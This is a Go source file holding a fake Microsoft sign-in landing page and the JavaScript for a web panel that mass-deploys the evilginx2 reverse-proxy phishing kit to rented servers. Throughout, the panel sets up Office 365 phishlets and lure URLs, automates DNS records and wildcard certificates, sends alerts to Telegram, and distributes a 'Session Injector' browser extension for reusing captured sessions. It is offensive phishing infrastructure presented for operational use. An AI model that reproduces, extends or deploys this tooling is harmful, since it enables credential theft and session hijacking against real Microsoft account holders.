package main

const landingHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Signing you in…</title>
<style>
  :root{--bg:#f3f3f3;--muted:#666;--accent:#0067b8}
  @media (prefers-color-scheme: dark){:root{--bg:#1b1b1b;--muted:#a0a0a0}}
  *{box-sizing:border-box;margin:0;padding:0}html,body{height:100%}
  body{font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,system-ui,sans-serif;background:var(--bg);display:flex;align-items:center;justify-content:center}
  .card{width:440px;max-width:92vw;background:#fff;color:#1b1b1b;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.1)}
  @media (prefers-color-scheme: dark){.card{background:#252525;color:#f3f3f3;box-shadow:none;border:1px solid #333}}
  .logo{width:108px;margin-bottom:24px}
  h1{font-size:24px;font-weight:600;margin-bottom:10px}
  p{font-size:15px;color:var(--muted)}
  .spin{margin-top:34px;width:22px;height:22px;border:2px solid rgba(0,103,184,.25);border-top-color:var(--accent);border-radius:50%;animation:s .9s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
</style>
</head>
<body>
  <div class="card">
    <svg class="logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
      <rect x="0" y="1" width="10" height="10" fill="#f25022"/>
      <rect x="11" y="1" width="10" height="10" fill="#7fba00"/>
      <rect x="0" y="12" width="10" height="10" fill="#00a4ef"/>
      <rect x="11" y="12" width="10" height="10" fill="#ffb900"/>
      <text x="27" y="18" font-family="Segoe UI,sans-serif" font-size="17" font-weight="600" fill="#5e5e5e">Microsoft</text>
    </svg>
    <h1>Signing you in…</h1>
    <p>Please wait while we take you to your account.</p>
    <div class="spin"></div>
  </div>
</body>
</html>
`

const cpJS = `'use strict';
var $ = function (s, r) { return (r || document).querySelector(s); };
var $$ = function (s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); };
function esc(v) { if (v === null || v === undefined) return ''; return String(v).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); }
function toast(m, k) { var el = document.createElement('div'); el.className = 't ' + (k || 'info'); el.textContent = m; $('#toast').appendChild(el); setTimeout(function () { el.remove(); }, 3200); }
function copy(t) { if (!t) return; navigator.clipboard.writeText(t).then(function () { toast('Copied', 'info'); }, function () { toast('Copy failed', 'err'); }); }
function ago(ts) { if (!ts) return 'never'; var s = Math.floor(Date.now() / 1000) - ts; if (s < 60) return s + 's ago'; if (s < 3600) return Math.floor(s / 60) + 'm ago'; if (s < 86400) return Math.floor(s / 3600) + 'h ago'; return Math.floor(s / 86400) + 'd ago'; }
function statusBadge(p) {
  if (!p.last_status) return '<span class="badge mut">not installed</span>';
  if (p.last_status === 'active') return '<span class="badge ok">running</span>';
  if (p.last_status === 'unreachable') return '<span class="badge err">unreachable</span>';
  if (p.last_status === 'inactive' || p.last_status === 'failed') return '<span class="badge warn">' + esc(p.last_status) + '</span>';
  return '<span class="badge mut">' + esc(p.last_status) + '</span>';
}

async function api(m, p, b) {
  var o = { method: m, headers: {} };
  if (b !== undefined) { o.headers['Content-Type'] = 'application/json'; o.body = JSON.stringify(b); }
  var r = await fetch(p, o);
  if (r.status === 401) { location.href = '/login'; throw new Error('unauthorized'); }
  var ct = r.headers.get('content-type') || '';
  var d = ct.indexOf('json') >= 0 ? await r.json() : await r.text();
  if (!r.ok) throw new Error((d && d.error) || ('HTTP ' + r.status));
  return d;
}
var API = { get: function (p) { return api('GET', p); }, post: function (p, b) { return api('POST', p, b || {}); }, del: function (p) { return api('DELETE', p); } };

var S = { page: 'servers', profiles: [], state: null, poll: null };

var NAV = [
  { id: 'servers', label: 'Servers', ico: '▤' },
  { id: 'activity', label: 'Activity', ico: '⧗' },
  { id: 'settings', label: 'Settings', ico: '⚙' }
];
var TITLES = {
  servers: ['Servers', 'Deploy and manage evil-pro on your VPS fleet'],
  activity: ['Activity', 'Recent jobs and their output'],
  settings: ['Settings', 'Build paths, toolchain and storage']
};

function renderNav() {
  var h = '';
  NAV.forEach(function (n) {
    var badge = (n.id === 'servers' && S.profiles.length) ? S.profiles.length : '';
    h += '<div class="nav-item' + (S.page === n.id ? ' active' : '') + '" data-act="nav" data-id="' + n.id + '">' +
      '<span>' + n.ico + '</span><span>' + n.label + '</span>' + (badge ? '<span class="count">' + badge + '</span>' : '') + '</div>';
  });
  $('#nav').innerHTML = h;
}
function goto(p) { location.hash = '#/' + p; }
function setHeader(t, d, a) { $('#title').textContent = t; $('#desc').textContent = d || ''; $('#actions').innerHTML = a || ''; }

/* ---------------- views ---------------- */

async function viewServers() {
  var d = await API.get('/api/profiles');
  S.profiles = d.profiles;
  setHeader(TITLES.servers[0], TITLES.servers[1],
    '<button class="btn sm" data-act="refresh">Refresh</button><button class="btn sm primary" data-act="new">+ Add server</button>');
  if (!d.profiles.length) return '<div class="empty"><div class="big">▤</div>No servers yet. Click <b>Add server</b> and enter the VPS IP + root password — the panel installs everything for you.</div>';
  var h = '<div class="grid cards">';
  d.profiles.forEach(function (p) {
    h += '<div class="card">' +
      '<div class="card-head"><h3>' + esc(p.name) + ' ' + statusBadge(p) + '</h3><span class="dim mono" style="font-size:10px">' + esc(p.user) + '@' + esc(p.host) + ':' + p.port + '</span></div>' +
      '<div style="padding:14px 16px">' +
        '<div class="kv">' +
          '<span class="k">Domain</span><span class="v">' + esc(p.domain || '—') + '</span>' +
          '<span class="k">Lure</span><span class="v">' + (p.domain ? 'https://login.' + esc(p.domain) + '/auth/login' : '—') + '</span>' +
          '<span class="k">Last check</span><span class="v">' + ago(p.last_seen) + '</span>' +
          (p.version ? '<span class="k">Version</span><span class="v">' + esc(p.version) + '</span>' : '') +
          (p.last_error ? '<span class="k">Error</span><span class="v" style="color:var(--err)">' + esc(p.last_error) + '</span>' : '') +
        '</div>' +
        '<div class="actions mt14">' +
          '<button class="btn sm primary" data-act="manage" data-id="' + p.id + '">Manage</button>' +
          '<button class="btn sm" data-act="deploy" data-id="' + p.id + '">' + (p.last_status ? 'Re-deploy' : 'Install') + '</button>' +
          '<button class="btn sm" data-act="update" data-id="' + p.id + '">Update</button>' +
          '<button class="btn sm" data-act="handoff" data-id="' + p.id + '">Hand-off</button>' +
          '<button class="btn sm" data-act="status" data-id="' + p.id + '">Status</button>' +
          '<button class="btn sm" data-act="logs" data-id="' + p.id + '">Logs</button>' +
          '<button class="btn sm" data-act="restart" data-id="' + p.id + '">Restart</button>' +
          '<button class="btn sm" data-act="edit" data-id="' + p.id + '">Edit</button>' +
          '<button class="btn sm danger" data-act="del" data-id="' + p.id + '">Delete</button>' +
        '</div>' +
      '</div></div>';
  });
  return h + '</div>';
}

async function viewActivity() {
  var d = await API.get('/api/jobs');
  setHeader(TITLES.activity[0], TITLES.activity[1], '<button class="btn sm" data-act="refresh">Refresh</button>');
  if (!d.jobs.length) return '<div class="empty"><div class="big">⧗</div>No jobs yet.</div>';
  d.jobs.sort(function (a, b) { return b.started - a.started; });
  var rows = d.jobs.map(function (j) {
    var cls = j.status === 'done' ? 'ok' : (j.status === 'error' ? 'err' : 'warn');
    return '<tr><td class="mono dim">' + esc(j.id) + '</td><td>' + esc(j.kind) + '</td><td><span class="badge ' + cls + '">' + esc(j.status) + '</span></td>' +
      '<td class="dim">' + ago(j.started) + '</td><td class="right"><button class="btn xs sm" data-act="job" data-id="' + j.id + '">Open</button></td></tr>';
  }).join('');
  return '<div class="card pad0"><table><thead><tr><th>ID</th><th>Kind</th><th>Status</th><th>Started</th><th></th></tr></thead><tbody>' + rows + '</tbody></table></div>';
}

async function viewSettings() {
  var s = await API.get('/api/state');
  S.state = s;
  setHeader(TITLES.settings[0], TITLES.settings[1]);
  return '<div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(420px,1fr))">' +
    '<div class="card"><div class="card-head"><h3>Build &amp; binary</h3><span class="badge ' + (s.go_found ? 'ok' : 'warn') + '">' + (s.go_found ? 'go found' : 'go missing') + '</span></div><div style="padding:16px">' +
      '<div class="field"><label>Repo directory</label><input id="sRepo" value="' + esc(s.repo_dir) + '"></div>' +
      '<div class="field"><label>linux/amd64 binary</label><input id="sAmd" value="' + esc(s.bin_amd64) + '"> <span class="hint">' + (s.amd64_ready ? 'present' : 'missing — will auto-build') + '</span></div>' +
      '<div class="field"><label>linux/arm64 binary</label><input id="sArm" value="' + esc(s.bin_arm64) + '"> <span class="hint">' + (s.arm64_ready ? 'present' : 'missing — will auto-build') + '</span></div>' +
      '<label class="switch mb14"><input type="checkbox" id="sAuto"' + (s.auto_build ? ' checked' : '') + '><span class="track"></span><span class="muted">Auto-build with local Go when a binary is missing</span></label>' +
      '<div class="actions"><button class="btn primary" data-act="save-settings">Save</button><button class="btn" data-act="build">Build binaries now</button></div>' +
    '</div></div>' +
    '<div class="card"><div class="card-head"><h3>Panel</h3></div><div style="padding:16px"><div class="kv">' +
      '<span class="k">Version</span><span class="v">' + esc(s.version) + '</span>' +
      '<span class="k">Host</span><span class="v">' + esc(s.host) + '</span>' +
      '<span class="k">Auth</span><span class="v">' + (s.auth ? 'enabled' : 'DISABLED') + '</span>' +
      '<span class="k">Store</span><span class="v">' + esc(s.store) + '</span>' +
      '<span class="k">Uptime</span><span class="v">' + Math.floor(s.uptime / 60) + 'm</span>' +
    '</div>' +
    '<div class="actions mt14"><button class="btn sm" data-act="ext">Download Session Injector (.zip)</button></div>' +
    '<div class="hint mt8">Give this extension + the Dashboard link to whoever views sessions.</div>' +
    '</div></div>' +
    '<div class="card"><div class="card-head"><h3>How it works</h3></div><div style="padding:16px" class="muted">' +
      '<p>1. Add a server (IP + root password or SSH key).</p>' +
      '<p>2. Click <b>Install</b> — the panel connects over SSH, installs the engine, writes config, opens the firewall, starts the service and verifies it.</p>' +
      '<p>3. Give the user the <b>Dashboard</b> link + the extension below.</p>' +
      '<p class="mt8">Each server keeps its own Dashboard. The Dashboard is what the end user opens; this panel never exposes their sessions.</p>' +
    '</div></div>' +
  '</div>';
}

/* ---------------- drawer: profile editor ---------------- */

function editProfile(p) {
  p = p || { auth_type: 'password', port: 22, user: 'root', install_dir: '/root/evilginx2', phishlet: 'o365new', dashboard_sub: 'panel', dashboard_user: 'admin', debug: true };
  openDrawer(p.id ? ('Edit · ' + esc(p.name)) : 'Add server',
    '<div class="tabs" id="pfTabs">' +
      '<div class="tab active" data-act="tab" data-id="conn">Connection</div>' +
      '<div class="tab" data-act="tab" data-id="dep">Deployment</div>' +
      '<div class="tab" data-act="tab" data-id="cf">Cloudflare</div>' +
      '<div class="tab" data-act="tab" data-id="extra">Extras</div>' +
    '</div>' +
    pane('conn', true,
      '<div class="row"><div class="field"><label>Name</label><input data-p="name" value="' + esc(p.name) + '"></div>' +
      '<div class="field" style="max-width:110px"><label>SSH port</label><input data-p="port" type="number" value="' + p.port + '"></div></div>' +
      '<div class="row"><div class="field"><label>Host / IP</label><input data-p="host" value="' + esc(p.host) + '"></div>' +
      '<div class="field"><label>User</label><input data-p="user" value="' + esc(p.user) + '"></div></div>' +
      '<div class="field"><label>Auth</label><select data-p="auth_type"><option value="password"' + (p.auth_type === 'password' ? ' selected' : '') + '>Password</option><option value="key"' + (p.auth_type === 'key' ? ' selected' : '') + '>SSH key file</option></select></div>' +
      '<div class="field"><label>Password</label><input data-p="password" type="password" value="' + esc(p.password) + '"></div>' +
      '<div class="row"><div class="field"><label>Key path</label><input data-p="key_path" value="' + esc(p.key_path) + '"></div>' +
      '<div class="field"><label>Key passphrase</label><input data-p="key_passphrase" type="password" value="' + esc(p.key_passphrase) + '"></div></div>' +
      '<div class="hint">Pinned host key: <span class="mono">' + esc(p.host_key_fp || 'not pinned yet') + '</span></div>') +
    pane('dep', false,
      '<div class="field"><label>Base domain</label><input data-p="domain" value="' + esc(p.domain) + '" placeholder="yoursite.com"><span class="hint">a wildcard A (*.domain) must point to the server</span></div>' +
      '<div class="field"><label>Install directory</label><input data-p="install_dir" value="' + esc(p.install_dir) + '"></div>' +
      '<div class="field"><label>Phishlet</label><input data-p="phishlet" value="' + esc(p.phishlet) + '"></div>' +
      '<div class="row"><div class="field"><label>Dashboard subdomain</label><input data-p="dashboard_sub" value="' + esc(p.dashboard_sub) + '"></div>' +
      '<div class="field"><label>Dashboard user</label><input data-p="dashboard_user" value="' + esc(p.dashboard_user) + '"></div></div>' +
      '<div class="field"><label>Dashboard password</label><input data-p="dashboard_pass" value="' + esc(p.dashboard_pass) + '"><span class="hint">empty = auto-generated on install</span></div>' +
      '<label class="switch mb14"><input type="checkbox" data-p="debug"' + (p.debug ? ' checked' : '') + '><span class="track"></span><span class="muted">Verbose (-debug) logging</span></label>') +
    pane('cf', false,
      '<div class="field"><label>Cloudflare API token</label><input data-p="cf_token" type="password" value="' + esc(p.cf_token) + '"><span class="hint">Zone:DNS:Edit — enables auto A records + wildcard cert</span></div>' +
      '<div class="row"><div class="field"><label>Cert email</label><input data-p="cert_email" value="' + esc(p.cert_email) + '"></div>' +
      '<label class="switch" style="margin-top:20px"><input type="checkbox" data-p="use_wildcard"' + (p.use_wildcard ? ' checked' : '') + '><span class="track"></span><span class="muted">Issue wildcard cert</span></label></div>' +
      '<div class="actions mt8"><button class="btn sm" data-act="cf-verify">Verify token</button></div>') +
    pane('extra', false,
      '<div class="row"><div class="field"><label>Telegram bot token</label><input data-p="telegram_token" value="' + esc(p.telegram_token) + '"></div>' +
      '<div class="field"><label>Telegram chat id</label><input data-p="telegram_chat" value="' + esc(p.telegram_chat) + '"></div></div>' +
      '<div class="field"><label>Notes</label><input data-p="notes" value="' + esc(p.notes) + '"></div>') +
    '<div class="actions mt14"><button class="btn primary" data-act="save-profile" data-id="' + (p.id || '') + '">Save</button>' +
    '<button class="btn" data-act="test-profile" data-id="' + (p.id || '') + '">Test connection</button>' +
    (p.id ? '<button class="btn danger" data-act="uninstall" data-id="' + p.id + '">Uninstall engine</button>' : '') +
    '</div>', 'data-id="' + (p.id || '') + '"');

  function pane(id, active, body) { return '<div class="pf-pane" data-pane="' + id + '"' + (active ? '' : ' style="display:none"') + '>' + body + '</div>'; }
}
function collectProfile() {
  var p = {};
  $$('[data-p]').forEach(function (el) {
    var k = el.getAttribute('data-p');
    p[k] = el.type === 'checkbox' ? el.checked : (el.type === 'number' ? parseInt(el.value || '0', 10) : el.value);
  });
  p.id = $('#drawerHead').getAttribute('data-id') || '';
  return p;
}

/* ---------------- install modal + job log ---------------- */

function deployModal(p) {
  openModal('Deploy to ' + esc(p.name),
    '<div class="field"><label>Full domain</label><input value="' + esc(p.domain || '') + '" disabled><span class="hint">set the domain in Edit if empty</span></div>' +
    '<label class="switch mb14"><input type="checkbox" id="oHarden" checked><span class="track"></span><span class="muted">Harden host (ufw, free port 53)</span></label>' +
    '<label class="switch mb14"><input type="checkbox" id="oFresh"' + (p.last_status ? '' : ' checked') + '><span class="track"></span><span class="muted">Overwrite config.json (fresh install)</span></label>' +
    '<label class="switch mb14"><input type="checkbox" id="oCF"' + (p.cf_token ? ' checked' : '') + '><span class="track"></span><span class="muted">Create DNS records via Cloudflare</span></label>' +
    '<label class="switch mb14"><input type="checkbox" id="oCert"' + (p.use_wildcard && p.cf_token ? ' checked' : '') + '><span class="track"></span><span class="muted">Issue wildcard certificate (DNS-01)</span></label>' +
    '<label class="switch mb14"><input type="checkbox" id="oTg"' + (p.telegram_token ? ' checked' : '') + '><span class="track"></span><span class="muted">Write Telegram credentials</span></label>' +
    '<div class="actions"><button class="btn primary" data-act="run-install" data-id="' + p.id + '">Install now</button></div>');
}

function jobModal(jobID) {
  openModal('Deploy log', '<div class="log" id="jobLog">starting…</div><div id="jobResult" class="mt14"></div>', true);
  pollJob(jobID);
}
function pollJob(id) {
  clearTimeout(S.poll);
  API.get('/api/jobs/' + id).then(function (j) {
    var el = $('#jobLog'); if (!el) return;
    el.textContent = (j.lines || []).join('\n');
    el.scrollTop = el.scrollHeight;
    if (j.status === 'running') { S.poll = setTimeout(function () { pollJob(id); }, 1300); return; }
    var r = j.result || {};
    var h = '';
    if (j.status === 'error') h += '<div class="badge err">failed</div><div class="mt8 mono" style="color:var(--err)">' + esc(j.err || '') + '</div>';
    else h += '<div class="badge ok">done</div>';
    if (r.lure || r.dashboard_http) {
      h += '<div class="card mt14" style="padding:14px"><div class="kv">' +
        (r.lure ? '<span class="k">Lure link</span><span class="v copy" data-act="copy" data-copy="' + esc(r.lure) + '">' + esc(r.lure) + '</span>' : '') +
        (r.dashboard_http ? '<span class="k">Dashboard</span><span class="v copy" data-act="copy" data-copy="' + esc(r.dashboard_http) + '">' + esc(r.dashboard_http) + '</span>' : '') +
        (r.dashboard_https ? '<span class="k">Dashboard TLS</span><span class="v">' + esc(r.dashboard_https) + '</span>' : '') +
        (r.dashboard_user ? '<span class="k">Login</span><span class="v">' + esc(r.dashboard_user) + ' / ' + esc(r.dashboard_pass) + '</span>' : '') +
        '</div><div class="actions mt14"><button class="btn sm" data-act="ext">Download extension</button>' +
        (r.dashboard_http ? '<button class="btn sm" data-act="open" data-copy="' + esc(r.dashboard_http) + '">Open dashboard</button>' : '') + '</div></div>';
    }
    $('#jobResult').innerHTML = h;
    render();
  }).catch(function (e) { $('#jobResult').innerHTML = '<div class="badge err">' + esc(e.message) + '</div>'; });
}

/* ---------------- modal / drawer ---------------- */
function openModal(title, body, wide) {
  $('#modalBox').className = 'box' + (wide ? ' wide' : '');
  $('#modalBox').innerHTML = '<div class="card-head"><h3>' + title + '</h3><button class="btn sm" data-act="modal-close">✕</button></div><div style="padding:16px">' + body + '</div>';
  $('#modal').classList.add('open');
}
function closeModal() { $('#modal').classList.remove('open'); }
function openDrawer(title, body, attrs) {
  $('#drawerHead').innerHTML = '<h3>' + title + '</h3><div class="actions" style="margin-left:auto"><button class="btn sm" data-act="drawer-close">✕</button></div>';
  $('#drawerHead').setAttribute('data-id', (attrs && attrs.replace(/.*data-id="([^"]*)".*/, '$1')) || '');
  $('#drawerBody').innerHTML = body;
  $('#drawer').classList.add('open'); $('#scrim').classList.add('open');
}
function closeDrawer() { $('#drawer').classList.remove('open'); $('#scrim').classList.remove('open'); }

/* ---------------- actions ---------------- */
var ACTIONS = {
  nav: function (id) { goto(id); },
  refresh: function () { render(); },
  'drawer-close': closeDrawer,
  'modal-close': closeModal,
  copy: function (id, el) { copy(el.getAttribute('data-copy')); },
  tab: function (id) { $$('#pfTabs .tab, #pfTabs .tab').forEach(function (t) { t.classList.toggle('active', t.getAttribute('data-id') === id); }); $$('.pf-pane').forEach(function (x) { x.style.display = x.getAttribute('data-pane') === id ? '' : 'none'; }); },

  new: function () { editProfile(null); },
  edit: function (id) { var p = S.profiles.find(function (x) { return x.id === id; }); editProfile(p); },
  test: function (id) { run(async function () { var d = await API.post('/api/profiles/' + id + '/test'); toast('reachable: ' + d.probe.os + ' ' + d.probe.arch, 'ok'); }); },
  'test-profile': function () { var p = collectProfile(); run(async function () { if (!p.id) { var s = await API.post('/api/profiles', p); p.id = s.id; } else { await API.post('/api/profiles', p); } var d = await API.post('/api/profiles/' + p.id + '/test'); toast('reachable: ' + d.probe.os + ' ' + d.probe.arch, 'ok'); }); },
  'cf-verify': function () { var p = collectProfile(); run(async function () { var d = await API.post('/api/cf/verify', { token: p.cf_token, domain: p.domain }); toast('Cloudflare OK' + (d.zone_id ? ' · zone found' : ''), 'ok'); }); },
  'save-profile': function () { run(async function () { var p = collectProfile(); var s = await API.post('/api/profiles', p); toast('saved', 'ok'); closeDrawer(); S.profiles = (await API.get('/api/profiles')).profiles; render(); if (!p.id) editProfile(s); }); },
  del: function (id) { if (confirm('Delete this server from the panel? (the VPS is not touched)')) run(async function () { await API.del('/api/profiles/' + id); toast('deleted', 'ok'); render(); }); },

  deploy: function (id) { var p = S.profiles.find(function (x) { return x.id === id; }); deployModal(p); },
  'run-install': function (id) {
    var o = { harden: $('#oHarden').checked, fresh: $('#oFresh').checked, with_cf: $('#oCF').checked, with_cert: $('#oCert').checked, telegram: $('#oTg').checked };
    run(async function () { closeModal(); var r = await API.post('/api/profiles/' + id + '/install', o); jobModal(r.job); });
  },
  update: function (id) { run(async function () { var r = await API.post('/api/profiles/' + id + '/update'); jobModal(r.job); }); },
  start: function (id) { run(async function () { var r = await API.post('/api/profiles/' + id + '/action', { action: 'start' }); jobModal(r.job); }); },
  stop: function (id) { run(async function () { var r = await API.post('/api/profiles/' + id + '/action', { action: 'stop' }); jobModal(r.job); }); },
  restart: function (id) { run(async function () { var r = await API.post('/api/profiles/' + id + '/action', { action: 'restart' }); jobModal(r.job); }); },
  uninstall: function (id) { if (confirm('Stop + disable the engine on this VPS? Config is kept.')) run(async function () { var r = await API.post('/api/profiles/' + id + '/uninstall'); closeDrawer(); jobModal(r.job); }); },
  status: function (id) { run(async function () { var s = await API.get('/api/profiles/' + id + '/status'); openModal('Status · ' + esc(s.domain), '<div class="kv">' +
      '<span class="k">Reachable</span><span class="v">' + (s.reachable ? 'yes' : 'no') + '</span>' +
      '<span class="k">Service</span><span class="v">' + esc(s.service || '—') + '</span>' +
      '<span class="k">Ports</span><span class="v">' + esc(s.ports || '—') + '</span>' +
      '<span class="k">Version</span><span class="v">' + esc(s.version || '—') + '</span>' +
      '<span class="k">Cert expiry</span><span class="v">' + esc(s.cert || '—') + '</span>' +
      (s.error ? '<span class="k">Error</span><span class="v" style="color:var(--err)">' + esc(s.error) + '</span>' : '') +
    '</div>'); render(); }); },
  logs: function (id) { run(async function () { var d = await API.get('/api/profiles/' + id + '/logs?lines=300'); openModal('Logs · evilginx', '<div class="log">' + esc(d.log) + '</div>', true); }); },
  handoff: function (id) { run(async function () { var h = await API.get('/api/profiles/' + id + '/handoff'); openModal('Hand-off · give this to the user',
      '<div class="kv">' +
      '<span class="k">Dashboard</span><span class="v copy" data-act="copy" data-copy="' + esc(h.dashboard_http) + '">' + esc(h.dashboard_http) + '</span>' +
      (h.dashboard_https ? '<span class="k">Dashboard TLS</span><span class="v">' + esc(h.dashboard_https) + '</span>' : '') +
      '<span class="k">Login</span><span class="v">' + esc(h.dashboard_user) + ' / ' + esc(h.dashboard_pass) + '</span>' +
      (h.lure ? '<span class="k">Lure link</span><span class="v copy" data-act="copy" data-copy="' + esc(h.lure) + '">' + esc(h.lure) + '</span>' : '') +
      '</div>' +
      '<div class="muted mt14"><b>To use sessions:</b> give them the Dashboard link + login above, plus the <b>Session Injector</b> extension (chrome://extensions → Developer mode → Load unpacked).</div>' +
      '<div class="actions mt14"><button class="btn sm primary" data-act="ext">Download extension .zip</button></div>'); }); },
  job: function (id) { jobModal(id); },
  ext: function () { window.open('/api/extension.zip'); },
  'save-settings': function () { run(async function () { await API.post('/api/settings', { repo_dir: $('#sRepo').value, bin_amd64: $('#sAmd').value, bin_arm64: $('#sArm').value, auto_build: $('#sAuto').checked }); toast('saved', 'ok'); }); },
  build: function () { run(async function () { var r = await API.post('/api/build'); jobModal(r.job); }); },
  theme: function () { var c = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light'; document.documentElement.setAttribute('data-theme', c); localStorage.setItem('theme', c); }
};

function run(fn) { (async function () { try { await fn(); } catch (e) { toast(e.message || String(e), 'err'); } })(); }

/* ---------------- router ---------------- */
var VIEWS = { servers: viewServers, activity: viewActivity, settings: viewSettings };
function page() { var h = (location.hash || '#/servers').replace(/^#\/?/, ''); return VIEWS[h] ? h : 'servers'; }
var rendering = false;
async function render() {
  if (rendering) return; rendering = true;
  S.page = page();
  setHeader(TITLES[S.page][0], TITLES[S.page][1], '<button class="btn sm" data-act="theme">◐</button><button class="btn sm" data-act="logout">Logout</button>');
  renderNav();
  $('#foot').textContent = S.state ? ('v' + S.state.version) : '';
  var c = $('#content'); c.innerHTML = '<div class="empty">loading…</div>';
  try { c.innerHTML = await VIEWS[S.page](); } catch (e) { c.innerHTML = '<div class="empty"><div class="big">⚠</div>' + esc(e.message) + '</div>'; }
  rendering = false;
}

document.addEventListener('click', function (e) {
  var t = e.target;
  while (t && t !== document && !(t.getAttribute && t.getAttribute('data-act'))) t = t.parentNode;
  if (!t || t === document) return;
  var act = t.getAttribute('data-act');
  var fn = ACTIONS[act];
  if (act === 'logout') { API.post('/api/logout').then(function () { location.href = '/login'; }); return; }
  if (!fn) return;
  e.preventDefault();
  fn(t.getAttribute('data-id'), t);
});
$('#scrim').addEventListener('click', function () { closeDrawer(); closeModal(); });
window.addEventListener('hashchange', render);

(async function init() {
  try {
    var s = localStorage.getItem('theme'); if (s) document.documentElement.setAttribute('data-theme', s);
    S.state = await API.get('/api/state');
    if (!location.hash) location.hash = '#/servers';
    await render();
  } catch (e) { $('#content').innerHTML = '<div class="empty">' + esc(e.message) + '</div>'; }
})();
`
